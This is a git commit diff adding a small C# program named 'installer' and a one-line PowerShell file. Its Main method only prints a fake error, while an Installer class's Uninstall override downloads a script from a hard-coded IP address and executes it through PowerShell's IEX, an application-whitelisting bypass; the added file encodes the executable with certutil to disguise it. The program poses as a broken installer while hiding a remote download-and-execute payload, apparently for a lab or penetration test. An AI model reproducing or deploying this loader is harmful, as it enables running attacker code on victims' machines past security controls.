1a9b2736c4382dac5070b42eafcd8e8a71ed5daf
orange-418 <minecaust@gmail.com>
2024-07-30 13:50:03 -0500

    commit

---
+++ installer/Program.cs
@@ -0,0 +1,38 @@
+﻿using System;
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
+using System.Configuration.Install;
+
+namespace installer
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            Console.WriteLine("oops, something went wrong");
+        }
+    }
+
+    [System.ComponentModel.RunInstaller(true)]
+    public class Sample : System.Configuration.Install.Installer
+    {
+        public override void Uninstall(System.Collections.IDictionary savedState)
+        {
+            String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.181:80/am.txt') | IEX";
+            Runspace rs = RunspaceFactory.CreateRunspace();
+            rs.Open();
+
+            PowerShell ps = PowerShell.Create();
+            ps.Runspace = rs;
+
+            ps.AddScript(cmd);
+
+            ps.Invoke();
+
+            rs.Close();
+        }
+    }
+}
+
+
+
---
+++ installer/bin/Debug/enc.ps1
@@ -0,0 +1,1 @@
+certutil -encode installer.exe util.txt
